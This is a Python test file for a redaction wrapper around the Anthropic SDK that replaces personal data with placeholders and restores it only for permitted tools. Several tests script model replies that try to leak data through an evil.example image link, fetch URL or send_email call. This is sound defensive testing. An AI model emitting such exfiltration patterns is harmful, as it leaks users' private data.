"""Claude through placeholders: what's sent holds none of it, and what comes back has it again."""

import inspect
import json
import re
import warnings

import pytest

from veil import FINANCE, Redactor
from veil.anthropic import (
    TAX_ID_REMOVED,
    BlockError,
    ConversationError,
    DomainError,
    Findings,
    GuardrailError,
    McpError,
    Session,
    wrap,
)

anthropic = pytest.importorskip("anthropic")
from anthropic.types import Message  # noqa: E402


def _message(*blocks, stop="end_turn"):
    content = [{"type": "text", "text": b} if isinstance(b, str) else
               {"type": "tool_use", "id": b[0], "name": b[1], "input": b[2]} for b in blocks]
    return Message.model_validate({
        "id": "msg", "type": "message", "role": "assistant", "model": "claude-opus-5-5", "content": content,
        "stop_reason": "tool_use" if any(not isinstance(b, str) for b in blocks) else stop,
        "stop_sequence": None, "usage": {"input_tokens": 10, "output_tokens": 5}})


class FakeClient:
    """Plays back scripted replies and keeps each request."""

    def __init__(self, script):
        self.script = list(script)
        self.requests = []
        self.messages = self
        self.beta = self
        self.api_key = "k"

    def create(self, **kwargs):
        self.requests.append(json.loads(json.dumps(kwargs, default=lambda b: b.model_dump(mode="json"))))
        return self.script.pop(0)


def _sent(client):
    return json.dumps(client.requests)


def test_a_tool_loop_never_shows_the_model_a_name_or_number_and_tools_get_them_back():
    fake = FakeClient([
        _message("Adding NAME_001.", ("t1", "add_member", {"name": "NAME_001", "ssn": "SSN_001"})),
        _message("Done: NAME_001 is in, at EMAIL_001."),
    ])
    client = wrap(fake, Redactor(FINANCE), restore={"add_member": "all"})
    messages = [{"role": "user", "content": "Add Avery Mockridge (SSN 123-45-6789, avery@example.com) as an LP"}]
    reply = client.messages.create(model="m", max_tokens=100, system="You manage a fund's members.",
                                   messages=messages)
    call = next(b for b in reply.content if b.type == "tool_use")
    assert call.input == {"name": "Avery Mockridge", "ssn": "123-45-6789"}
    assert reply.content[0].text == "Adding Avery Mockridge."

    messages += [{"role": "assistant", "content": reply.content},
                 {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1",
                                               "content": json.dumps({"added": "Avery Mockridge",
                                                                      "email": "avery@example.com"})}]}]
    reply = client.messages.create(model="m", max_tokens=100, messages=messages)
    assert reply.content[0].text == "Done: Avery Mockridge is in, at avery@example.com."

    sent = _sent(fake)
    for secret in ("Mockridge", "123-45-6789", "6789", "avery@"):
        assert secret not in sent
    assert "NAME_001" in sent and "SSN_001" in sent and "EMAIL_001" in sent
    # The model's own earlier turn goes back as it said it.
    assert fake.requests[1]["messages"][1]["content"][1]["input"] == {"name": "NAME_001", "ssn": "SSN_001"}
    # The caller's history still holds the real values.
    assert "Avery Mockridge" in messages[0]["content"]


def test_system_prompt_text_blocks_and_thinking():
    fake = FakeClient([_message("ok")])
    client = wrap(fake)
    client.redactor.add_person("Zeb Quarrington")
    thinking = {"type": "thinking", "thinking": "NAME_001 wants", "signature": "sig"}
    client.messages.create(model="m", max_tokens=10,
                           system=[{"type": "text", "text": "The client is Zeb Quarrington."}],
                           messages=[{"role": "user", "content": [{"type": "text", "text": "Hi, Zeb Quarrington here"}]},
                                     {"role": "assistant", "content": [thinking, {"type": "text", "text": "Hello"}]},
                                     {"role": "user", "content": "thanks"}])
    req = fake.requests[0]
    assert req["system"][0]["text"] == "The client is NAME_001."
    assert req["messages"][0]["content"][0]["text"] == "Hi, NAME_001 here"
    assert req["messages"][1]["content"][0] == thinking


def test_streaming_is_refused_rather_than_sent_unredacted():
    client = wrap(FakeClient([]))
    with pytest.raises(NotImplementedError):
        client.messages.create(model="m", max_tokens=1, stream=True, messages=[])


@pytest.mark.parametrize("name", ["stream", "parse", "tool_runner"])
def test_messages_methods_veil_doesnt_wrap_are_refused_rather_than_sent_unredacted(name):
    fake = FakeClient([])
    fake.stream = fake.parse = fake.tool_runner = fake.create
    client = wrap(fake)
    for messages in (client.messages, client.beta.messages):
        with pytest.raises(NotImplementedError):
            getattr(messages, name)(model="m", max_tokens=1, messages=[{"role": "user", "content": "jane@example.com"}])
    assert fake.requests == []


@pytest.mark.parametrize("name", ["batches", "with_raw_response", "with_streaming_response", "anything_else"])
def test_messages_attributes_veil_doesnt_wrap_are_not_handed_out(name):
    fake = FakeClient([])
    setattr(fake, name, object())
    client = wrap(fake)
    with pytest.raises((NotImplementedError, AttributeError)):
        getattr(client.messages, name)


def test_the_real_sdk_has_nothing_on_messages_that_skips_veil():
    client = wrap(anthropic.Anthropic(api_key="k"))
    for name in ("stream", "parse", "tool_runner"):
        with pytest.raises(NotImplementedError):
            getattr(client.messages, name)(model="m", max_tokens=1, messages=[])
    for name in ("batches", "with_raw_response", "with_streaming_response"):
        with pytest.raises(NotImplementedError):
            getattr(client.messages, name)


def test_the_legacy_completions_api_is_refused_rather_than_sent_unredacted():
    fake = FakeClient([])
    fake.completions = fake
    client = wrap(fake)
    with pytest.raises(NotImplementedError, match="completions"):
        client.completions.create(model="m", max_tokens_to_sample=1, prompt="\n\nHuman: jane@example.com")
    assert fake.requests == []


@pytest.mark.parametrize("path", ["with_raw_response", "with_streaming_response",
                                  "beta.with_raw_response", "beta.with_streaming_response"])
def test_raw_response_forms_of_the_client_are_refused(path):
    client = wrap(anthropic.Anthropic(api_key="k"))
    owner = client.beta if path.startswith("beta.") else client
    with pytest.raises(NotImplementedError):
        getattr(owner, path.removeprefix("beta."))


@pytest.mark.parametrize("make", [lambda c: c.with_options(timeout=5, max_retries=1), lambda c: c.copy(timeout=5)])
def test_a_client_with_other_options_still_goes_through_placeholders(make):
    client = wrap(anthropic.Anthropic(api_key="k"), Redactor(FINANCE))
    other = make(client)
    assert isinstance(other, type(client)) and other.session is client.session
    assert other.timeout == 5 and other.messages._session is client.session
    with pytest.raises(NotImplementedError):
        other.messages.stream(model="m", max_tokens=1, messages=[])


@pytest.mark.parametrize("path", ["files", "skills", "post", "request", "get_api_list", "organization",
                                  "beta.files", "beta.sessions", "beta.agents", "beta.vaults", "no_such_thing"])
def test_what_veil_doesnt_wrap_isnt_offered(path):
    client = wrap(anthropic.Anthropic(api_key="k"))
    owner = client.beta if path.startswith("beta.") else client
    with pytest.raises(AttributeError, match="isn't offered"):
        getattr(owner, path.removeprefix("beta."))
    assert not hasattr(owner, path.removeprefix("beta."))


def test_settings_and_the_models_list_are_the_wrapped_clients():
    raw = anthropic.Anthropic(api_key="k", base_url="https://example.test", max_retries=7)
    client = wrap(raw)
    assert (client.api_key, client.base_url, client.max_retries) == ("k", raw.base_url, 7)
    assert client.models is raw.models and client.beta.models is raw.beta.models
    assert not client.is_closed()


def test_bedrock_and_vertex_settings_are_offered():
    bedrock = wrap(anthropic.AnthropicBedrock(aws_region="us-east-1", aws_access_key="a", aws_secret_key="b"))
    assert bedrock.aws_region == "us-east-1"
    vertex = wrap(anthropic.AnthropicVertex(region="us-east5", project_id="p", access_token="t"))
    assert (vertex.region, vertex.project_id) == ("us-east5", "p")


def test_a_client_with_middleware_still_goes_through_placeholders():
    raw = anthropic.Anthropic(api_key="k")
    if not hasattr(raw, "with_middleware"):
        pytest.skip("this SDK has no middleware")
    client = wrap(raw)
    other = client.with_middleware()
    assert isinstance(other, type(client)) and other.session is client.session


def test_search_results_are_redacted_alone_and_inside_a_tool_result():
    s = Session(Redactor(FINANCE))
    found = {"type": "search_result", "source": "https://crm/jane@example.com", "title": "Avery Mockridge, LP",
             "content": [{"type": "text", "text": "Avery Mockridge, SSN 123-45-6789"}]}
    out = s.redact_request({"messages": [
        {"role": "user", "content": [found]},
        {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": [found]}]}]})
    sent = json.dumps(out)
    for secret in ("Mockridge", "123-45-6789", "jane@"):
        assert secret not in sent
    assert out["messages"][1]["content"][0]["content"][0]["type"] == "search_result"


def test_a_block_veil_doesnt_know_is_refused_rather_than_sent_as_it_is():
    s = Session()
    with pytest.raises(BlockError):
        s.redact_request({"messages": [{"role": "user", "content": [{"type": "new_kind", "text": "SSN 123-45-6789"}]}]})
    with pytest.raises(BlockError):
        s.redact_request({"messages": [{"role": "user", "content": ["SSN 123-45-6789"]}]})


def test_blocks_anthropics_own_tools_wrote_go_back_as_they_are():
    s = Session()
    block = {"type": "web_search_tool_result", "tool_use_id": "s", "content": [
        {"type": "web_search_result", "url": "https://example.com", "title": "x", "encrypted_content": "abc"}]}
    out = s.redact_request({"messages": [{"role": "assistant", "content": [block]}]})
    assert out["messages"][0]["content"][0] == block


def test_tool_descriptions_and_metadata_are_redacted():
    fake = FakeClient([_message("ok")])
    client = wrap(fake)
    tool = {"name": "add_member", "description": "Adds members. Example: Avery Mockridge, SSN 123-45-6789.",
            "input_schema": {"type": "object", "required": ["ssn"], "properties": {
                "ssn": {"type": "string", "description": "e.g. 987-65-4321"},
                "description": {"type": "string"}}}}
    client.messages.create(model="m", max_tokens=1, tools=[tool], metadata={"user_id": "avery@example.com"},
                           messages=[{"role": "user", "content": "hi"}])
    sent = fake.requests[0]
    for secret in ("Mockridge", "123-45-6789", "987-65-4321", "avery@"):
        assert secret not in json.dumps(sent)
    schema = sent["tools"][0]["input_schema"]
    assert schema["required"] == ["ssn"] and set(schema["properties"]) == {"ssn", "description"}
    assert sent["metadata"]["user_id"] == "EMAIL_001"


_SEARCH = {"type": "web_search_20250305", "name": "web_search", "max_uses": 3, "allowed_domains": ["sec.gov"],
           "user_location": {"type": "approximate", "city": "Springfield", "region": "Illinois", "country": "US",
                             "timezone": "America/Chicago"}}


@pytest.mark.parametrize("option, want", [
    ({}, {"type": "approximate", "country": "US", "timezone": "America/Chicago"}),
    ({"user_location": "send"}, _SEARCH["user_location"]),
    ({"user_location": "drop"}, None),
    ({"redact_system": False}, {"type": "approximate", "country": "US", "timezone": "America/Chicago"})])
def test_web_search_sends_only_as_much_of_the_users_location_as_it_is_told(option, want):
    fake = FakeClient([_message("ok")])
    client = wrap(fake, **option)
    client.messages.create(model="m", max_tokens=1, tools=[_SEARCH], messages=[{"role": "user", "content": "hi"}])
    sent = fake.requests[0]["tools"][0]
    assert sent.get("user_location") == want
    assert {k: v for k, v in sent.items() if k != "user_location"} == \
        {k: v for k, v in _SEARCH.items() if k != "user_location"}
    assert _SEARCH["user_location"]["city"] == "Springfield"   # the caller's tool is left as it was


_ABOUT_AVERY = [{"role": "user", "content": "Research Avery Mockridge (avery@mockridgefamily.com, jo@gmail.com)."}]


@pytest.mark.parametrize("key", ["allowed_domains", "blocked_domains"])
@pytest.mark.parametrize("domain", ["mockridgefamily.com", "*.mockridgefamily.com", "averymockridge.com",
                                    "avery-mockridge.com", "mockridge-law.com", "123-45-6789.example.com"])
def test_domains_that_name_someone_are_refused_and_nothing_is_sent(key, domain):
    fake = FakeClient([])
    tool = {"type": "web_fetch_20250910", "name": "web_fetch", key: ["sec.gov", domain]}
    with pytest.raises(DomainError, match=re.escape(domain)):
        wrap(fake).messages.create(model="m", max_tokens=1, tools=[tool], messages=_ABOUT_AVERY)
    assert fake.requests == []


def test_ordinary_domains_go_as_they_are():
    fake = FakeClient([_message("ok")])
    tool = {**_SEARCH, "allowed_domains": ["sec.gov", "gmail.com", "nytimes.com", "avery.com"]}
    wrap(fake).messages.create(model="m", max_tokens=1, tools=[tool], messages=_ABOUT_AVERY)
    assert fake.requests[0]["tools"][0]["allowed_domains"] == tool["allowed_domains"]


def test_domains_go_as_they_are_when_told():
    fake = FakeClient([_message("ok")])
    tool = {**_SEARCH, "allowed_domains": ["mockridgefamily.com"]}
    wrap(fake, domains="send").messages.create(model="m", max_tokens=1, tools=[tool], messages=_ABOUT_AVERY)
    assert fake.requests[0]["tools"][0]["allowed_domains"] == ["mockridgefamily.com"]
    assert "Mockridge" not in json.dumps(fake.requests[0]["messages"])


_MCP = [{"type": "url", "url": "https://crm.example/mcp", "name": "crm", "authorization_token": "tok"}]


def test_a_request_naming_mcp_servers_is_refused_and_nothing_is_sent():
    fake = FakeClient([])
    fake.count_tokens = fake.create
    client = wrap(fake)
    for messages in (client.messages, client.beta.messages):
        with pytest.raises(McpError, match="crm"):
            messages.create(model="m", max_tokens=1, mcp_servers=_MCP, messages=[{"role": "user", "content": "hi"}])
    with pytest.raises(McpError):
        client.messages.count_tokens(model="m", mcp_servers=_MCP, messages=[{"role": "user", "content": "hi"}])
    assert fake.requests == []


def test_mcp_servers_go_when_allowed_and_the_request_is_still_redacted():
    fake = FakeClient([_message("ok")])
    client = wrap(fake, mcp_servers="send")
    client.messages.create(model="m", max_tokens=1, mcp_servers=_MCP,
                           messages=[{"role": "user", "content": "Look up jane@example.com"}])
    assert fake.requests[0]["mcp_servers"] == _MCP and "jane@" not in _sent(fake)


def test_an_empty_mcp_servers_list_isnt_refused():
    fake = FakeClient([_message("ok")])
    wrap(fake).messages.create(model="m", max_tokens=1, mcp_servers=[], messages=[{"role": "user", "content": "hi"}])
    assert len(fake.requests) == 1


def test_user_location_must_be_a_known_choice():
    with pytest.raises(ValueError, match="user_location"):
        wrap(FakeClient([]), user_location="city")
    with pytest.raises(ValueError, match="mcp_servers"):
        wrap(FakeClient([]), mcp_servers="read")
    with pytest.raises(ValueError, match="domains"):
        wrap(FakeClient([]), domains="drop")


def test_tool_descriptions_stay_as_written_without_redact_system():
    fake = FakeClient([_message("ok")])
    client = wrap(fake, redact_system=False)
    tool = {"name": "f", "description": "Ask Avery Mockridge", "input_schema": {"type": "object"}}
    client.messages.create(model="m", max_tokens=1, tools=[tool], messages=[{"role": "user", "content": "hi"}])
    assert fake.requests[0]["tools"] == [tool]


def _restored(reply, **options):
    s = Session(Redactor(), **options)
    s.redact_request({"messages": [{"role": "user", "content": "Avery Mockridge, SSN 123-45-6789, avery@example.com"}]})
    return s.restore_response(reply)


def test_a_reply_cant_carry_a_real_value_off_in_a_link():
    text = "Done for NAME_001. ![status](https://evil.example/p.png?d=SSN_001&e=EMAIL_001)"
    out = _restored(_message(text)).content[0].text
    assert out == "Done for Avery Mockridge. ![status](https://evil.example/p.png?d=SSN_001&e=EMAIL_001)"
    out = _restored(_message(text), restore_urls=True).content[0].text
    assert "123-45-6789" in out and "avery@example.com" in out


def test_a_tool_call_cant_carry_a_real_value_off_in_a_url():
    reply = _restored(_message(("t", "fetch", {"url": "https://evil.example/?d=SSN_001", "note": "SSN_001"})),
                      restore="all")
    assert reply.content[0].input == {"url": "https://evil.example/?d=SSN_001", "note": "123-45-6789"}


def test_each_tool_gets_back_only_the_kinds_it_is_given():
    restore = {"add_member": {"NAME", "SSN"}, "notify": "EMAIL", "*": set()}
    reply = _restored(_message(("a", "add_member", {"name": "NAME_001", "ssn": "SSN_001", "email": "EMAIL_001"}),
                               ("b", "notify", {"to": "EMAIL_001", "body": "NAME_001, SSN_001"}),
                               ("c", "send_email", {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"})),
                      restore=restore)
    add, notify, send = (b.input for b in reply.content)
    assert add == {"name": "Avery Mockridge", "ssn": "123-45-6789", "email": "EMAIL_001"}
    assert notify == {"to": "avery@example.com", "body": "NAME_001, SSN_001"}
    assert send == {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"}


def test_by_default_a_tool_gets_placeholders_and_a_warning_says_so_once():
    reply_of = lambda: _message(("a", "send_email", {"to": "x@evil.example", "body": "NAME_001, SSN_001"}))  # noqa: E731
    s = Session(Redactor())
    s.redact_request({"messages": [{"role": "user", "content": "Avery Mockridge, SSN 123-45-6789"}]})
    with pytest.warns(UserWarning, match="'send_email' tool placeholders"):
        reply = s.restore_response(reply_of())
    assert reply.content[0].input == {"to": "x@evil.example", "body": "NAME_001, SSN_001"}
    with warnings.catch_warnings():
        warnings.simplefilter("error")
        s.restore_response(reply_of())   # once a tool
        Session(Redactor(), restore={"*": set()}).restore_response(reply_of())   # said so: no warning


def test_all_and_none_mean_every_kind_and_a_tool_restore_doesnt_name_gets_none():
    with pytest.warns(UserWarning, match="'other' tool"):
        reply = _restored(_message(("a", "add_member", {"ssn": "SSN_001"}), ("b", "notify", {"ssn": "SSN_001"}),
                                   ("c", "other", {"ssn": "SSN_001"})),
                          restore={"add_member": "all", "notify": None})
    assert [b.input for b in reply.content] == [{"ssn": "123-45-6789"}, {"ssn": "123-45-6789"}, {"ssn": "SSN_001"}]
    reply = _restored(_message(("c", "other", {"ssn": "SSN_001"})), restore="all")
    assert reply.content[0].input == {"ssn": "123-45-6789"}
    with pytest.raises(ValueError, match="restore"):
        wrap(FakeClient([]), restore="some")
    client = wrap(FakeClient([]), restore={"*": set()}, restore_urls=True)
    assert client.session.restore == {"*": set()} and client.session.restore_urls


def _ask(text):
    return [{"role": "user", "content": text}]


def test_a_second_conversation_through_one_client_is_refused_and_nothing_is_sent():
    fake = FakeClient([_message("ok"), _message("ok")])
    client = wrap(fake)
    first = _ask("Add Avery Mockridge, SSN 123-45-6789")
    client.messages.create(model="m", max_tokens=1, messages=first)
    client.messages.create(model="m", max_tokens=1, messages=first + [
        {"role": "assistant", "content": "ok"}, {"role": "user", "content": "And her email?"}])   # the same one
    with pytest.raises(ConversationError):
        client.messages.create(model="m", max_tokens=1, messages=_ask("Hi, I'm Priya Patel"))
    with pytest.raises(ConversationError):
        client.beta.messages.create(model="m", max_tokens=1, messages=_ask("Hi, I'm Priya Patel"))
    assert len(fake.requests) == 2


def test_a_redactor_passed_to_another_client_keeps_to_its_conversation():
    redactor = Redactor()
    first = _ask("Add Avery Mockridge")
    wrap(FakeClient([_message("ok")]), redactor).messages.create(model="m", max_tokens=1, messages=first)
    later = FakeClient([_message("ok")])
    wrap(later, redactor).messages.create(model="m", max_tokens=1, messages=first + [
        {"role": "assistant", "content": "ok"}, {"role": "user", "content": "Thanks"}])
    assert "NAME_001" in _sent(later)
    with pytest.raises(ConversationError):
        wrap(FakeClient([]), redactor).messages.create(model="m", max_tokens=1, messages=_ask("Someone else"))


def test_a_refused_request_doesnt_claim_the_redactor_and_the_check_can_be_turned_off():
    fake = FakeClient([_message("ok"), _message("ok")])
    client = wrap(fake)
    with pytest.raises(BlockError):
        client.messages.create(model="m", max_tokens=1, messages=[{"role": "user", "content": [{"type": "new"}]}])
    client.messages.create(model="m", max_tokens=1, messages=_ask("Add Avery Mockridge"))
    trimmed = wrap(fake, client.redactor, one_conversation=False)
    trimmed.messages.create(model="m", max_tokens=1, messages=_ask("(earlier turns trimmed) And her SSN?"))
    assert len(fake.requests) == 2


class FakeAsyncClient(FakeClient):
    async def create(self, **kwargs):
        return FakeClient.create(self, **kwargs)

    async def count_tokens(self, **kwargs):
        return FakeClient.create(self, **kwargs)


def test_an_async_client_goes_through_placeholders_and_tools_get_real_values_back():
    import asyncio

    fake = FakeAsyncClient([_message("Adding NAME_001.", ("t1", "add_member", {"name": "NAME_001", "ssn": "SSN_001"})),
                            _message("ok")])
    client = wrap(fake, Redactor(FINANCE), restore={"add_member": "all"})
    messages = [{"role": "user", "content": "Add Avery Mockridge (SSN 123-45-6789) as an LP"}]

    async def run():
        reply = await client.messages.create(model="m", max_tokens=10, messages=messages)
        await client.beta.messages.count_tokens(model="m", messages=messages)
        with pytest.raises(NotImplementedError):
            await client.messages.create(model="m", max_tokens=1, stream=True, messages=messages)
        with pytest.raises(ConversationError):
            await client.messages.create(model="m", max_tokens=1, messages=_ask("Someone else"))
        return reply

    reply = asyncio.run(run())
    assert reply.content[0].text == "Adding Avery Mockridge."
    assert reply.content[1].input == {"name": "Avery Mockridge", "ssn": "123-45-6789"}
    assert len(fake.requests) == 2 and "Mockridge" not in _sent(fake) and "123-45-6789" not in _sent(fake)


def test_the_real_async_sdk_client_sends_only_placeholders_and_gets_real_values_back():
    import asyncio

    httpx = pytest.importorskip("httpx2")   # the HTTP client the SDK is built on
    sent = []

    def handler(request):
        sent.append(json.loads(request.content))
        return httpx.Response(200, json={
            "id": "msg", "type": "message", "role": "assistant", "model": "m", "stop_reason": "end_turn",
            "stop_sequence": None, "usage": {"input_tokens": 1, "output_tokens": 1},
            "content": [{"type": "text", "text": "Done for NAME_001."}]})

    async def run():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
            client = wrap(anthropic.AsyncAnthropic(api_key="k", http_client=http))
            return await client.messages.create(model="m", max_tokens=10,
                                                messages=[{"role": "user", "content": "File it for Avery Mockridge"}])

    reply = asyncio.run(run())
    assert sent[0]["messages"][0]["content"] == "File it for NAME_001"
    assert reply.content[0].text == "Done for Avery Mockridge."


@pytest.mark.parametrize("make", [
    lambda: anthropic.AsyncAnthropic(api_key="k"),
    lambda: anthropic.AsyncAnthropicBedrock(aws_region="us-east-1", aws_access_key="a", aws_secret_key="b"),
    lambda: anthropic.AsyncAnthropicVertex(region="us-east5", project_id="p", access_token="t")])
def test_async_clients_are_awaited_and_keep_what_they_refuse(make):
    client = wrap(make())
    for messages in (client.messages, client.beta.messages, client.with_options(timeout=5).messages):
        assert inspect.iscoroutinefunction(messages.create)
        with pytest.raises(NotImplementedError):
            messages.stream(model="m", max_tokens=1, messages=[])
    assert not inspect.iscoroutinefunction(wrap(anthropic.Anthropic(api_key="k")).messages.create)


def test_other_attributes_pass_through():
    fake = FakeClient([_message("ok")])
    client = wrap(fake)
    assert client.api_key == "k"
    client.beta.messages.create(model="m", max_tokens=1, messages=[{"role": "user", "content": "jane@example.com"}])
    assert "jane@" not in _sent(fake)


# -- with a guardrail --------------------------------------------------------------------------------------

NONE = Findings()


def pii(*matches, kind="SSN"):
    return Findings(hidden=[(kind, m) for m in matches])


class FakeGuardrail:
    """A guardrail that answers with ``answer(source, texts)``, or raises it if it's an exception."""

    def __init__(self, answer):
        self.answer = answer
        self.calls = []

    def check(self, texts, source):
        self.calls.append({"source": source, "texts": texts})
        result = self.answer(source, texts)
        if isinstance(result, Exception):
            raise result
        return result


def _guarded(answer, script, redactor=None):
    api = FakeGuardrail(answer)
    fake = FakeClient(script)
    client = wrap(fake, redactor or Redactor(FINANCE), guardrail=api, restore="all")
    return client, fake, api


def test_a_number_the_placeholders_miss_is_hidden_before_it_is_sent():
    # Nine digits in an odd grouping with no label: the placeholders don't catch it; the guardrail does.
    client, fake, api = _guarded(
        lambda source, texts: pii("555 4433 33") if any("555 4433 33" in t for t in texts) else NONE,
        [_message("SSN_001 is on page 1.")])
    reply = client.messages.create(model="m", max_tokens=10, messages=[
        {"role": "user", "content": "Partner reference 555 4433 33 (as filed). What is it?"}])
    assert "4433" not in _sent(fake) and "reference SSN_001" in _sent(fake)
    assert reply.content[0].text == "555 4433 33 is on page 1."
    assert [c["source"] for c in api.calls] == ["INPUT", "OUTPUT"]


def test_only_new_text_is_checked():
    client, fake, api = _guarded(lambda source, texts: NONE, [_message("one"), _message("two")])
    messages = [{"role": "user", "content": "First question"}]
    client.messages.create(model="m", max_tokens=10, messages=messages)
    messages += [{"role": "assistant", "content": "one"}, {"role": "user", "content": "Second question"}]
    client.messages.create(model="m", max_tokens=10, messages=messages)
    inputs = [c["texts"] for c in api.calls if c["source"] == "INPUT"]
    assert inputs == [["First question"], ["Second question"]]


def test_a_request_it_stops_or_cant_check_is_never_sent():
    blocked = Findings(other=["the denied topic 'Investment advice'"])
    answers = [blocked]
    client, fake, api = _guarded(lambda source, texts: answers[-1], [_message("Fine.")])
    messages = [{"role": "user", "content": "Should I buy more of Fund III?"}]
    with pytest.raises(GuardrailError, match="flagged the denied topic 'Investment advice'. Nothing was sent."):
        client.messages.create(model="m", max_tokens=10, messages=messages)
    answers.append(GuardrailError("The guardrail couldn't run (boom)."))
    with pytest.raises(GuardrailError, match=r"couldn't run \(boom\). Nothing was sent."):
        client.messages.create(model="m", max_tokens=10, messages=messages)
    answers.append(pii("555 44 3333"))   # quoted differently from the text: can't be hidden
    with pytest.raises(GuardrailError, match="a taxpayer ID that couldn't be found in the text to hide"):
        client.messages.create(model="m", max_tokens=10, messages=messages)
    assert fake.requests == []
    answers.append(NONE)
    assert client.messages.create(model="m", max_tokens=10, messages=messages).content[0].text == "Fine."


def test_a_number_in_a_reply_is_taken_out_and_a_reply_it_objects_to_is_replaced():
    answers = {"OUTPUT": pii("987654321")}
    client, fake, api = _guarded(lambda source, texts: answers.get(source, NONE),
                                 [_message("Its EIN might be 987654321."), _message("Rude."), _message("Hm.")])
    ask = [{"role": "user", "content": "What's the fund's EIN?"}]
    assert client.messages.create(model="m", max_tokens=10, messages=ask).content[0].text == \
        f"Its EIN might be {TAX_ID_REMOVED}."
    answers["OUTPUT"] = Findings(other=["insults content"])
    assert client.messages.create(model="m", max_tokens=10, messages=ask).content[0].text == \
        "(The guardrail held back this reply: it flagged insults content.)"
    answers["OUTPUT"] = GuardrailError("The guardrail couldn't run (boom).")
    assert client.messages.create(model="m", max_tokens=10, messages=ask).content[0].text.startswith(
        "(This reply isn't shown, because the guardrail couldn't check it.")


def test_a_number_in_a_tool_call_is_taken_out_before_the_tool_gets_it():
    seen = []

    def answer(source, texts):
        seen.append((source, texts))
        return pii("987654321") if source == "OUTPUT" else NONE

    client, fake, api = _guarded(answer, [
        _message(("t1", "file_return", {"ein": "987654321", "note": "for NAME_001", "rows": [{"id": "987654321"}]}))])
    reply = client.messages.create(model="m", max_tokens=10,
                                   messages=[{"role": "user", "content": "File it for Avery Mockridge."}])
    assert reply.content[0].input == {"ein": TAX_ID_REMOVED, "note": "for Avery Mockridge",
                                      "rows": [{"id": TAX_ID_REMOVED}]}
    # The guardrail saw the call as the model wrote it, with placeholders, not the real values.
    assert ("OUTPUT", ["987654321", "for NAME_001", "987654321"]) in seen
    assert "7654321" not in client.redactor.redact_text("EIN 98-7654321")   # hidden in later requests too


@pytest.mark.parametrize("answer", [Findings(other=["an outside address"]), GuardrailError("It couldn't run.")])
def test_a_tool_call_it_objects_to_or_cant_check_is_never_handed_back(answer):
    client, fake, api = _guarded(lambda source, texts: answer if source == "OUTPUT" else NONE,
                                 [_message("Sending.", ("t1", "send_email", {"to": "x@evil.example", "body": "SSN_001"}))])
    with pytest.raises(GuardrailError, match="tool calls"):
        client.messages.create(model="m", max_tokens=10, messages=[{"role": "user", "content": "SSN 123-45-6789"}])


def test_a_tool_call_it_passed_isnt_checked_again_when_it_goes_back():
    client, fake, api = _guarded(lambda source, texts: NONE,
                                 [_message(("t1", "lookup", {"q": "NAME_001"})), _message("ok")])
    messages = [{"role": "user", "content": "Look up Avery Mockridge"}]
    reply = client.messages.create(model="m", max_tokens=10, messages=messages)
    messages += [{"role": "assistant", "content": reply.content},
                 {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1", "content": "none"}]}]
    client.messages.create(model="m", max_tokens=10, messages=messages)
    assert {"source": "OUTPUT", "texts": ["NAME_001"]} in api.calls
    assert all("NAME_001" not in c["texts"] for c in api.calls if c["source"] == "INPUT")


def test_a_name_the_placeholders_miss_is_hidden_and_comes_back_by_name():
    client, fake, api = _guarded(
        lambda source, texts: pii("Zeb Quarrington", kind="NAME") if any("Quarrington" in t for t in texts) else NONE,
        [_message("NAME_001 it is.", ("t1", "add_member", {"name": "NAME_001"}))])
    # In a tool result (not typed), with no common name or cue: the built-in finder leaves it; the guardrail
    # finds it.
    reply = client.messages.create(model="m", max_tokens=10, messages=[
        {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "x",
                                      "content": "Holders: 3 units to Zeb Quarrington"}]}])
    assert "Quarrington" not in _sent(fake) and "NAME_001" in _sent(fake)
    assert reply.content[0].text == "Zeb Quarrington it is."
    assert reply.content[1].input == {"name": "Zeb Quarrington"}


def test_session_works_without_a_client():
    s = Session(Redactor(FINANCE))
    out = s.redact_request({"messages": [{"role": "user", "content": "Call me at 415-555-0134"}]})
    assert out["messages"][0]["content"] == "Call me at PHONE_001"
    restored = s.restore_response({"content": [{"type": "text", "text": "Calling PHONE_001"}]})
    assert restored["content"][0]["text"] == "Calling 415-555-0134"
